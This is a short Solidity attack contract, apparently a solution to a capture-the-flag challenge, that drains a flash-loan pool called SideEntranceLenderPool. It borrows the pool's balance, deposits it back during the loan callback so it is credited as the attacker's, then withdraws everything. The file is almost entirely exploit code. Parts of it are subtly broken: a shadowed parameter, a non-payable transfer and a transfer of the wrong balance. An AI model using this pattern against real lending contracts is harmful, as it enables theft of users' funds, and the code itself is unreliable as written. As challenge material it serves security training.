//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

///@notice implement the flashloan first and deposit the whole balance thru execute(), this will update balance of the attacker for the amount they can withdraw. now when the flashloan is executed, the attacker will be able to withdraw the whole balance.

contract attack {
    SideEntranceLenderPool pool;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
    }

    fallback() external payable {}

    function attack(address pool) public {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        msg.sender.transfer(address(pool).balance);
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }
}
